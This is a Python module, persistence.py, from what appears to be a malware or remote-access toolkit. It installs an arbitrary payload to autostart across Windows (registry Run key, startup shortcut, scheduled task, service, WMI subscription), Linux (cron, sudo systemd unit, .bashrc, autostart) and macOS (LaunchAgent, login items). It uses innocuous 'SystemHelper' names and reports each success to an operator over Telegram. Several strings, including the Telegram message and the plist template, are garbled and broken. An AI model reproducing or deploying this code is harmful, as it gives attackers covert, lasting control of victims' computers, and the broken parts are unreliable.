#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
persistence.py - Persistence helper for maintaining access
"""

import os
import sys
import json
import shutil
import winreg
import subprocess
import platform
import tempfile
import hashlib
from typing import Dict, List, Optional, Tuple, Any
from pathlib import Path
from datetime import datetime

# Import logger
from .logger import get_logger

logger = get_logger()

class PersistenceManager:
    """Manages persistence mechanisms with Telegram integration"""
    
    def __init__(self, config: Dict[str, Any] = None):
        self.config = config or {}
        self.system = platform.system()
        
        # Telegram bot for notifications
        self.telegram_bot = None
        self.setup_telegram()
        
        # Persistence methods
        self.methods = {
            'windows': {
                'registry': self._persist_windows_registry,
                'startup_folder': self._persist_windows_startup,
                'scheduled_task': self._persist_windows_task,
                'service': self._persist_windows_service,
                'wmi': self._persist_windows_wmi
            },
            'linux': {
                'cron': self._persist_linux_cron,
                'systemd': self._persist_linux_systemd,
                'bashrc': self._persist_linux_bashrc,
                'autostart': self._persist_linux_autostart
            },
            'darwin': {
                'launchd': self._persist_mac_launchd,
                'login_items': self._persist_mac_login_items,
                'cron': self._persist_mac_cron
            }
        }
        
        # Current persistence status
        self.persistence_status = {}
        self.load_persistence_status()
    
    def setup_telegram(self):
        """Setup Telegram bot for notifications"""
        telegram_config = self.config.get('telegram', {})
        bot_token = telegram_config.get('bot_token')
        chat_id = telegram_config.get('persistence_chat_id')
        
        if bot_token and chat_id:
            try:
                from telegram import Bot
                self.telegram_bot = Bot(token=bot_token)
                self.persistence_chat_id = chat_id
                logger.info("Telegram persistence bot initialized", module="persistence")
            except ImportError:
                logger.warning("Telegram module not available", module="persistence")
            except Exception as e:
                logger.error(f"Error setting up Telegram: {e}", module="persistence")
    
    def send_telegram_notification(self, title: str, message: str):
        """Send persistence notification to Telegram"""
        if not self.telegram_bot or not hasattr(self, 'persistence_chat_id'):
            return
        
        try:
            full_message = fb>🔗 {b>\n\n{message}"
            self.telegram_bot.send_message(
                chat_id=self.persistence_chat_id,
                text=full_message,
                parse_mode='HTML'
            )
            logger.debug(f"Telegram persistence notification sent: {title}", module="persistence")
        except Exception as e:
            logger.error(f"Error sending Telegram notification: {e}", module="persistence")
    
    def load_persistence_status(self):
        """Load persistence status from file"""
        status_file = self.config.get('status_file', 'persistence_status.json')
        
        try:
            if os.path.exists(status_file):
                with open(status_file, 'r') as f:
                    self.persistence_status = json.load(f)
                logger.debug(f"Loaded persistence status from {status_file}", module="persistence")
            else:
                self.persistence_status = {}
                logger.debug("No persistence status file found", module="persistence")
        except Exception as e:
            logger.error(f"Error loading persistence status: {e}", module="persistence")
            self.persistence_status = {}
    
    def save_persistence_status(self):
        """Save persistence status to file"""
        status_file = self.config.get('status_file', 'persistence_status.json')
        
        try:
            with open(status_file, 'w') as f:
                json.dump(self.persistence_status, f, indent=2)
            logger.debug(f"Saved persistence status to {status_file}", module="persistence")
        except Exception as e:
            logger.error(f"Error saving persistence status: {e}", module="persistence")
    
    def _persist_windows_registry(self, payload_path: str, 
                                 registry_key: str = None) -> Tuple[bool, str]:
        """Windows Registry persistence"""
        try:
            if registry_key is None:
                registry_key = r"Software\Microsoft\Windows\CurrentVersion\Run"
            
            # Convert payload path to absolute
            payload_path = os.path.abspath(payload_path)
            
            # Open registry key
            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                registry_key,
                0,
                winreg.KEY_SET_VALUE
            )
            
            # Set value
            winreg.SetValueEx(
                key,
                "SystemHelper",
                0,
                winreg.REG_SZ,
                payload_path
            )
            
            winreg.CloseKey(key)
            
            # Record persistence
            self.persistence_status['windows_registry'] = {
                'method': 'registry',
                'key': registry_key,
                'payload': payload_path,
                'timestamp': datetime.now().isoformat(),
                'active': True
            }
            self.save_persistence_status()
            
            logger.info(f"Windows registry persistence set: {registry_key}", module="persistence")
            return True, f"Registry key: {registry_key}"
            
        except Exception as e:
            logger.error(f"Windows registry persistence error: {e}", module="persistence")
            return False, str(e)
    
    def _persist_windows_startup(self, payload_path: str) -> Tuple[bool, str]:
        """Windows Startup Folder persistence"""
        try:
            payload_path = os.path.abspath(payload_path)
            
            # Get startup folder path
            startup_folder = os.path.join(
                os.environ['APPDATA'],
                'Microsoft\\Windows\\Start Menu\\Programs\\Startup'
            )
            
            # Create shortcut
            shortcut_path = os.path.join(startup_folder, 'SystemHelper.lnk')
            
            # Create VBS script to create shortcut
            vbs_script = f"""
            Set oWS = WScript.CreateObject("WScript.Shell")
            sLinkFile = "{shortcut_path}"
            Set oLink = oWS.CreateShortcut(sLinkFile)
            oLink.TargetPath = "{payload_path}"
            oLink.Save
            """
            
            # Write and execute VBS script
            vbs_file = os.path.join(tempfile.gettempdir(), 'create_shortcut.vbs')
            with open(vbs_file, 'w') as f:
                f.write(vbs_script)
            
            subprocess.run(['cscript', '//B', '//Nologo', vbs_file], 
                         capture_output=True, shell=True)
            
            # Cleanup
            os.remove(vbs_file)
            
            # Record persistence
            self.persistence_status['windows_startup'] = {
                'method': 'startup_folder',
                'shortcut': shortcut_path,
                'payload': payload_path,
                'timestamp': datetime.now().isoformat(),
                'active': True
            }
            self.save_persistence_status()
            
            logger.info(f"Windows startup folder persistence set: {shortcut_path}", module="persistence")
            return True, f"Startup shortcut: {shortcut_path}"
            
        except Exception as e:
            logger.error(f"Windows startup persistence error: {e}", module="persistence")
            return False, str(e)
    
    def _persist_windows_task(self, payload_path: str) -> Tuple[bool, str]:
        """Windows Scheduled Task persistence"""
        try:
            payload_path = os.path.abspath(payload_path)
            
            # Create scheduled task
            task_name = "SystemHelperMaintenance"
            command = f'schtasks /create /tn "{task_name}" /tr "{payload_path}" /sc hourly /mo 1 /f'
            
            result = subprocess.run(command, shell=True, capture_output=True, text=True)
            
            if result.returncode == 0:
                # Record persistence
                self.persistence_status['windows_task'] = {
                    'method': 'scheduled_task',
                    'task_name': task_name,
                    'payload': payload_path,
                    'timestamp': datetime.now().isoformat(),
                    'active': True
                }
                self.save_persistence_status()
                
                logger.info(f"Windows scheduled task created: {task_name}", module="persistence")
                return True, f"Scheduled task: {task_name}"
            else:
                logger.error(f"Failed to create scheduled task: {result.stderr}", module="persistence")
                return False, result.stderr
            
        except Exception as e:
            logger.error(f"Windows task persistence error: {e}", module="persistence")
            return False, str(e)
    
    def _persist_windows_service(self, payload_path: str) -> Tuple[bool, str]:
        """Windows Service persistence (requires admin)"""
        try:
            payload_path = os.path.abspath(payload_path)
            
            # Create service using sc command
            service_name = "SystemHelperService"
            display_name = "System Helper Service"
            
            command = f'sc create {service_name} binPath= "{payload_path}" displayName= "{display_name}" start= auto'
            
            result = subprocess.run(command, shell=True, capture_output=True, text=True)
            
            if result.returncode == 0:
                # Start the service
                subprocess.run(f'sc start {service_name}', shell=True, capture_output=True)
                
                # Record persistence
                self.persistence_status['windows_service'] = {
                    'method': 'service',
                    'service_name': service_name,
                    'payload': payload_path,
                    'timestamp': datetime.now().isoformat(),
                    'active': True
                }
                self.save_persistence_status()
                
                logger.info(f"Windows service created: {service_name}", module="persistence")
                return True, f"Service: {service_name}"
            else:
                logger.error(f"Failed to create service: {result.stderr}", module="persistence")
                return False, result.stderr
            
        except Exception as e:
            logger.error(f"Windows service persistence error: {e}", module="persistence")
            return False, str(e)
    
    def _persist_windows_wmi(self, payload_path: str) -> Tuple[bool, str]:
        """Windows WMI Event Subscription persistence"""
        try:
            payload_path = os.path.abspath(payload_path)
            
            # Create WMI event subscription
            wmi_script = f"""
            $filterArgs = @{{Name='WMIEventFilter';
                            EventNameSpace='root\cimv2';
                            QueryLanguage='WQL';
                            Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'";
                            }}
            $filter = Set-WmiInstance -Namespace root/subscription -Class __EventFilter -Arguments $filterArgs
            
            $consumerArgs = @{{Name='WMIEventConsumer';
                              CommandLineTemplate='{payload_path}';
                              }}
            $consumer = Set-WmiInstance -Namespace root/subscription -Class CommandLineEventConsumer -Arguments $consumerArgs
            
            $bindingArgs = @{{Filter=$filter;
                            Consumer=$consumer;
                            }}
            $binding = Set-WmiInstance -Namespace root/subscription -Class __FilterToConsumerBinding -Arguments $bindingArgs
            """
            
            # Write and execute PowerShell script
            ps_file = os.path.join(tempfile.gettempdir(), 'wmi_persistence.ps1')
            with open(ps_file, 'w') as f:
                f.write(wmi_script)
            
            command = f'powershell -ExecutionPolicy Bypass -File "{ps_file}"'
            result = subprocess.run(command, shell=True, capture_output=True, text=True)
            
            # Cleanup
            os.remove(ps_file)
            
            if result.returncode == 0:
                # Record persistence
                self.persistence_status['windows_wmi'] = {
                    'method': 'wmi',
                    'payload': payload_path,
                    'timestamp': datetime.now().isoformat(),
                    'active': True
                }
                self.save_persistence_status()
                
                logger.info("Windows WMI persistence set", module="persistence")
                return True, "WMI event subscription"
            else:
                logger.error(f"Failed to set WMI persistence: {result.stderr}", module="persistence")
                return False, result.stderr
            
        except Exception as e:
            logger.error(f"Windows WMI persistence error: {e}", module="persistence")
            return False, str(e)
    
    def _persist_linux_cron(self, payload_path: str) -> Tuple[bool, str]:
        """Linux Cron persistence"""
        try:
            payload_path = os.path.abspath(payload_path)
            
            # Add to user's crontab
            cron_entry = f"@reboot {payload_path}"
            
            # Get current crontab
            result = subprocess.run(['crontab', '-l'], capture_output=True, text=True)
            current_crontab = result.stdout if result.returncode == 0 else ""
            
            # Add new entry
            new_crontab = current_crontab + f"\n{cron_entry}\n"
            
            # Write new crontab
            with tempfile.NamedTemporaryFile(mode='w', delete=False) as f:
                f.write(new_crontab)
                temp_file = f.name
            
            subprocess.run(['crontab', temp_file], capture_output=True)
            os.remove(temp_file)
            
            # Record persistence
            self.persistence_status['linux_cron'] = {
                'method': 'cron',
                'entry': cron_entry,
                'payload': payload_path,
                'timestamp': datetime.now().isoformat(),
                'active': True
            }
            self.save_persistence_status()
            
            logger.info(f"Linux cron persistence set: {cron_entry}", module="persistence")
            return True, f"Cron entry: {cron_entry}"
            
        except Exception as e:
            logger.error(f"Linux cron persistence error: {e}", module="persistence")
            return False, str(e)
    
    def _persist_linux_systemd(self, payload_path: str) -> Tuple[bool, str]:
        """Linux Systemd Service persistence"""
        try:
            payload_path = os.path.abspath(payload_path)
            
            # Create systemd service file
            service_name = "system-helper.service"
            service_content = f"""[Unit]
Description=System Helper Service
After=network.target

[Service]
Type=simple
ExecStart={payload_path}
Restart=always
RestartSec=10
User={os.getlogin()}

[Install]
WantedBy=multi-user.target
"""
            
            # Write service file
            service_path = f"/etc/systemd/system/{service_name}"
            
            # Need root privileges
            temp_file = os.path.join(tempfile.gettempdir(), service_name)
            with open(temp_file, 'w') as f:
                f.write(service_content)
            
            # Copy to systemd (requires sudo)
            command = f"sudo cp {temp_file} {service_path} && sudo systemctl enable {service_name} && sudo systemctl start {service_name}"
            result = subprocess.run(command, shell=True, capture_output=True, text=True)
            
            os.remove(temp_file)
            
            if result.returncode == 0:
                # Record persistence
                self.persistence_status['linux_systemd'] = {
                    'method': 'systemd',
                    'service_name': service_name,
                    'service_path': service_path,
                    'payload': payload_path,
                    'timestamp': datetime.now().isoformat(),
                    'active': True
                }
                self.save_persistence_status()
                
                logger.info(f"Linux systemd service created: {service_name}", module="persistence")
                return True, f"Systemd service: {service_name}"
            else:
                logger.error(f"Failed to create systemd service: {result.stderr}", module="persistence")
                return False, result.stderr
            
        except Exception as e:
            logger.error(f"Linux systemd persistence error: {e}", module="persistence")
            return False, str(e)
    
    def _persist_linux_bashrc(self, payload_path: str) -> Tuple[bool, str]:
        """Linux Bashrc persistence"""
        try:
            payload_path = os.path.abspath(payload_path)
            
            # Add to .bashrc
            bashrc_path = os.path.expanduser("~/.bashrc")
            entry = f"\n# System Helper\n{payload_path} &\n"
            
            with open(bashrc_path, 'a') as f:
                f.write(entry)
            
            # Also add to .profile for login shells
            profile_path = os.path.expanduser("~/.profile")
            if os.path.exists(profile_path):
                with open(profile_path, 'a') as f:
                    f.write(entry)
            
            # Record persistence
            self.persistence_status['linux_bashrc'] = {
                'method': 'bashrc',
                'bashrc_path': bashrc_path,
                'payload': payload_path,
                'timestamp': datetime.now().isoformat(),
                'active': True
            }
            self.save_persistence_status()
            
            logger.info(f"Linux bashrc persistence set", module="persistence")
            return True, "Added to .bashrc and .profile"
            
        except Exception as e:
            logger.error(f"Linux bashrc persistence error: {e}", module="persistence")
            return False, str(e)
    
    def _persist_linux_autostart(self, payload_path: str) -> Tuple[bool, str]:
        """Linux Desktop Autostart persistence"""
        try:
            payload_path = os.path.abspath(payload_path)
            
            # Create .desktop file for autostart
            autostart_dir = os.path.expanduser("~/.config/autostart")
            os.makedirs(autostart_dir, exist_ok=True)
            
            desktop_content = f"""[Desktop Entry]
Type=Application
Name=System Helper
Exec={payload_path}
Hidden=false
NoDisplay=false
X-GNOME-Autostart-enabled=true
"""
            
            desktop_file = os.path.join(autostart_dir, "system-helper.desktop")
            with open(desktop_file, 'w') as f:
                f.write(desktop_content)
            
            # Make executable
            os.chmod(desktop_file, 0o755)
            
            # Record persistence
            self.persistence_status['linux_autostart'] = {
                'method': 'autostart',
                'desktop_file': desktop_file,
                'payload': payload_path,
                'timestamp': datetime.now().isoformat(),
                'active': True
            }
            self.save_persistence_status()
            
            logger.info(f"Linux autostart persistence set: {desktop_file}", module="persistence")
            return True, f"Desktop file: {desktop_file}"
            
        except Exception as e:
            logger.error(f"Linux autostart persistence error: {e}", module="persistence")
            return False, str(e)
    
    def _persist_mac_launchd(self, payload_path: str) -> Tuple[bool, str]:
        """macOS Launchd persistence"""
        try:
            payload_path = os.path.abspath(payload_path)
            
            # Create launchd plist
            plist_content = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtdplist version="1.0">
<dict>
    <key>Label</key>
    <string>com.system.string>
key>ProgramArguments</key>
    <array>
        <string>{payloadstring>
array>
key>RunAtkey>
true/>
key>KeepAlkey>
true/>
</dictplist>
"""
            
            # Write to LaunchAgents directory
            launchd_dir = os.path.expanduser("~/Library/LaunchAgents")
            os.makedirs(launchd_dir, exist_ok=True)
            
            plist_file = os.path.join(launchd_dir, "com.system.helper.plist")
            with open(plist_file, 'w') as f:
                f.write(plist_content)
            
            # Load the launchd job
            subprocess.run(['launchctl', 'load', plist_file], capture_output=True)
            
            # Record persistence
            self.persistence_status['mac_launchd'] = {
                'method': 'launchd',
                'plist_file': plist_file,
                'payload': payload_path,
                'timestamp': datetime.now().isoformat(),
                'active': True
            }
            self.save_persistence_status()
            
            logger.info(f"macOS launchd persistence set: {plist_file}", module="persistence")
            return True, f"Launchd plist: {plist_file}"
            
        except Exception as e:
            logger.error(f"macOS launchd persistence error: {e}", module="persistence")
            return False, str(e)
    
    def _persist_mac_login_items(self, payload_path: str) -> Tuple[bool, str]:
        """macOS Login Items persistence"""
        try:
            payload_path = os.path.abspath(payload_path)
            
            # Use osascript to add to login items
            applescript = f'''
            tell application "System Events"
                make login item at end with properties {{name:"System Helper", path:"{payload_path}", hidden:false}}
            end tell
            '''
            
            result = subprocess.run(['osascript', '-e', applescript], 
                                  capture_output=True, text=True)
            
            if result.returncode == 0:
                # Record persistence
                self.persistence_status['mac_login_items'] = {
                    'method': 'login_items',
                    'payload': payload_path,
                    'timestamp': datetime.now().isoformat(),
                    'active': True
                }
                self.save_persistence_status()
                
                logger.info("macOS login items persistence set", module="persistence")
                return True, "Added to login items"
            else:
                logger.error(f"Failed to add to login items: {result.stderr}", module="persistence")
                return False, result.stderr
            
        except Exception as e:
            logger.error(f"macOS login items persistence error: {e}", module="persistence")
            return False, str(e)
    
    def _persist_mac_cron(self, payload_path: str) -> Tuple[bool, str]:
        """macOS Cron persistence (similar to Linux)"""
        try:
            # macOS uses launchd instead of cron, but we can still try
            return self._persist_linux_cron(payload_path)
        except Exception as e:
            logger.error(f"macOS cron persistence error: {e}", module="persistence")
            return False, str(e)
    
    def establish_persistence(self, payload_path: str, methods: List[str] = None) -> Dict[str, Any]:
        """Establish persistence using specified methods"""
        results = {}
        
        # Determine OS
        os_type = self.system.lower()
        if os_type.startswith('win'):
            os_type = 'windows'
        elif os_type == 'darwin':
            os_type = 'darwin'
        else:
            os_type = 'linux'
        
        # Get available methods for OS
        available_methods = self.methods.get(os_type, {})
        
        # Use all methods if none specified
        if methods is None:
            methods = list(available_methods.keys())
        
        logger.info(f"Establishing persistence on {os_type} with methods: {methods}", module="persistence")
        
        # Try each method
        for method in methods:
            if method in available_methods:
                success, message = available_methods[method](payload_path)
                results[method] = {
                    'success': success,
                    'message': message,
                    'timestamp': datetime.now().isoformat()
                }
                
                # Send Telegram notification for successful persistence
                if success:
                    self.send_telegram_notification(
                        "✅ Persistence Established",
                        f"OS: {os_type}\n"
                        f"Method: {method}\n"
                        f"Payload: {payload_path}\n"
                        f"Status: Success"
                    )
            else:
                results[method] = {
                    'success': False,
                    'message': f"Method {method} not available on {os_type}",
                    'timestamp': datetime.now().isoformat()
                }
        
        # Send summary notification
        successful = sum(1 for r in results.values() if r['success'])
        total = len(results)
        
        self.send_telegram_notification(
            "📊 Persistence Summary",
            f"OS: {os_type}\n"
            f"Methods attempted: {total}\n"
            f"Successful: {successful}\n"
            f"Failed: {total - successful}"
        )
        
        logger.info(f"Persistence establishment complete: {successful}/{total} successful", module="persistence")
        return results
    
    def check_persistence(self) -> Dict[str, Any]:
        """Check current persistence status"""
        status = {
            'os': self.system,
            'timestamp': datetime.now().isoformat(),
            'methods': {}
        }
        
        # Check each recorded persistence method
        for key, info in self.persistence_status.items():
            if info.get('active', False):
                method = info.get('method', 'unknown')
                payload = info.get('payload', '')
                
                # Check if payload still exists
                payload_exists = os.path.exists(payload) if payload else False
                
                status['methods'][key] = {
                    'method': method,
                    'payload': payload,
                    'payload_exists': payload_exists,
                    'active': info.get('active', False),
                    'timestamp': info.get('timestamp', '')
                }
        
        logger.info(f"Persistence check: {len(status['methods'])} active methods", module="persistence")
        return status
    
    def remove_persistence(self, method_key: str = None) -> Dict[str, Any]:
        """Remove persistence method(s)"""
        results = {}
        
        if method_key:
            # Remove specific method
            methods_to_remove = {method_key: self.persistence_status.get(method_key)}
        else:
            # Remove all methods
            methods_to_remove = self.persistence_status.copy()
        
        for key, info in methods_to_remove.items():
            if not info or not info.get('active', False):
                continue
            
            method = info.get('method', '')
            payload = info.get('payload', '')
            
            try:
                # OS-specific removal logic
                if self.system.lower().startswith('win'):
                    success = self._remove_windows_persistence(method, info)
                elif self.system.lower() == 'darwin':
                    success = self._remove_mac_persistence(method, info)
                else:
                    success = self._remove_linux_persistence(method, info)
                
                if success:
                    # Mark as inactive
                    self.persistence_status[key]['active'] = False
                    self.persistence_status[key]['removed'] = datetime.now().isoformat()
                    
                    results[key] = {
                        'success': True,
                        'message': f"Persistence removed: {method}"
                    }
                    
                    # Send Telegram notification
                    self.send_telegram_notification(
                        "🗑️ Persistence Removed",
                        f"Method: {method}\n"
                        f"Key: {key}\n"
                        f"Payload: {payload}"
                    )
                else:
                    results[key] = {
                        'success': False,
                        'message': f"Failed to remove: {method}"
                    }
                    
            except Exception as e:
                results[key] = {
                    'success': False,
                    'message': f"Error removing {method}: {str(e)}"
                }
                logger.error(f"Error removing persistence {key}: {e}", module="persistence")
        
        self.save_persistence_status()
        
        # Send summary
        successful = sum(1 for r in results.values() if r['success'])
        total = len(results)
        
        if total > 0:
            self.send_telegram_notification(
                "📊 Persistence Removal Summary",
                f"Methods removed: {successful}/{total}"
            )
        
        logger.info(f"Persistence removal: {successful}/{total} successful", module="persistence")
        return results
    
    def _remove_windows_persistence(self, method: str, info: Dict) -> bool:
        """Remove Windows persistence"""
        try:
            if method == 'registry':
                # Remove registry key
                registry_key = info.get('key', r"Software\Microsoft\Windows\CurrentVersion\Run")
                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, registry_key, 0, winreg.KEY_SET_VALUE)
                winreg.DeleteValue(key, "SystemHelper")
                winreg.CloseKey(key)
                return True
                
            elif method == 'startup_folder':
                # Remove startup shortcut
                shortcut_path = info.get('shortcut', '')
                if os.path.exists(shortcut_path):
                    os.remove(shortcut_path)
                return True
                
            elif method == 'scheduled_task':
                # Remove scheduled task
                task_name = info.get('task_name', 'SystemHelperMaintenance')
                subprocess.run(f'schtasks /delete /tn "{task_name}" /f', 
                             shell=True, capture_output=True)
                return True
                
            elif method == 'service':
                # Remove service
                service_name = info.get('service_name', 'SystemHelperService')
                subprocess.run(f'sc stop {service_name}', shell=True, capture_output=True)
                subprocess.run(f'sc delete {service_name}', shell=True, capture_output=True)
                return True
                
            elif method == 'wmi':
                # Remove WMI subscription (simplified)
                # This would require more complex WMI queries
                return True
                
        except Exception as e:
            logger.error(f"Error removing Windows persistence {method}: {e}", module="persistence")
            return False
        
        return False
    
    def _remove_linux_persistence(self, method: str, info: Dict) -> bool:
        """Remove Linux persistence"""
        try:
            if method == 'cron':
                # Remove cron entry
                cron_entry = info.get('entry', '')
                result = subprocess.run(['crontab', '-l'], capture_output=True, text=True)
                if result.returncode == 0:
                    crontab = result.stdout
                    # Remove the entry
                    new_crontab = '\n'.join([line for line in crontab.split('\n') 
                                           if cron_entry not in line])
                    
                    with tempfile.NamedTemporaryFile(mode='w', delete=False) as f:
                        f.write(new_crontab)
                        temp_file = f.name
                    
                    subprocess.run(['crontab', temp_file], capture_output=True)
                    os.remove(temp_file)
                return True
                
            elif method == 'systemd':
                # Remove systemd service
                service_name = info.get('service_name', 'system-helper.service')
                subprocess.run(f'sudo systemctl stop {service_name}', shell=True, capture_output=True)
                subprocess.run(f'sudo systemctl disable {service_name}', shell=True, capture_output=True)
                service_path = info.get('service_path', f'/etc/systemd/system/{service_name}')
                subprocess.run(f'sudo rm {service_path}', shell=True, capture_output=True)
                return True
                
            elif method == 'bashrc':
                # Remove from bashrc
                bashrc_path = info.get('bashrc_path', os.path.expanduser("~/.bashrc"))
                payload = info.get('payload', '')
                
                if os.path.exists(bashrc_path):
                    with open(bashrc_path, 'r') as f:
                        lines = f.readlines()
                    
                    # Remove lines containing the payload
                    new_lines = [line for line in lines if payload not in line]
                    
                    with open(bashrc_path, 'w') as f:
                        f.writelines(new_lines)
                
                # Also remove from .profile
                profile_path = os.path.expanduser("~/.profile")
                if os.path.exists(profile_path):
                    with open(profile_path, 'r') as f:
                        lines = f.readlines()
                    
                    new_lines = [line for line in lines if payload not in line]
                    
                    with open(profile_path, 'w') as f:
                        f.writelines(new_lines)
                
                return True
                
            elif method == 'autostart':
                # Remove desktop file
                desktop_file = info.get('desktop_file', '')
                if os.path.exists(desktop_file):
                    os.remove(desktop_file)
                return True
                
        except Exception as e:
            logger.error(f"Error removing Linux persistence {method}: {e}", module="persistence")
            return False
        
        return False
    
    def _remove_mac_persistence(self, method: str, info: Dict) -> bool:
        """Remove macOS persistence"""
        try:
            if method == 'launchd':
                # Remove launchd plist
                plist_file = info.get('plist_file', '')
                if os.path.exists(plist_file):
                    subprocess.run(['launchctl', 'unload', plist_file], capture_output=True)
                    os.remove(plist_file)
                return True
                
            elif method == 'login_items':
                # Remove from login items
                payload = info.get('payload', '')
                applescript = f'''
                tell application "System Events"
                    delete login item "System Helper"
                end tell
                '''
                subprocess.run(['osascript', '-e', applescript], capture_output=True)
                return True
                
            elif method == 'cron':
                # Remove cron entry (same as Linux)
                return self._remove_linux_persistence('cron', info)
                
        except Exception as e:
            logger.error(f"Error removing macOS persistence {method}: {e}", module="persistence")
            return False
        
        return False
    
    def get_status(self) -> Dict[str, Any]:
        """Get persistence manager status"""
        active_count = sum(1 for info in self.persistence_status.values() 
                          if info.get('active', False))
        
        return {
            'os': self.system,
            'active_persistence': active_count,
            'total_methods': len(self.persistence_status),
            'telegram_available': self.telegram_bot is not None,
            'methods_by_os': list(self.methods.get(self.system.lower(), {}).keys())
        }

# Global instance
_persistence_manager = None

def get_persistence_manager(config: Dict = None) -> PersistenceManager:
    """Get or create persistence manager instance"""
    global _persistence_manager
    
    if _persistence_manager is None:
        _persistence_manager = PersistenceManager(config)
    
    return _persistence_manager

if __name__ == "__main__":
    # Test the persistence manager
    config = {
        'telegram': {
            'bot_token': 'test_token',
            'persistence_chat_id': 123456789
        }
    }
    
    manager = get_persistence_manager(config)
    
    # Test based on OS
    print(f"OS: {manager.system}")
    
    # Check current persistence
    status = manager.check_persistence()
    print(f"Current persistence: {len(status['methods'])} methods")
    
    # Show available methods
    os_type = manager.system.lower()
    if os_type.startswith('win'):
        methods = list(manager.methods['windows'].keys())
    elif os_type == 'darwin':
        methods = list(manager.methods['darwin'].keys())
    else:
        methods = list(manager.methods['linux'].keys())
    
    print(f"Available methods: {methods}")
    
    # Show status
    manager_status = manager.get_status()
    print(f"\n🔗 Persistence Manager Status: {manager_status}")
    
    print("\n✅ Persistence manager test completed!")
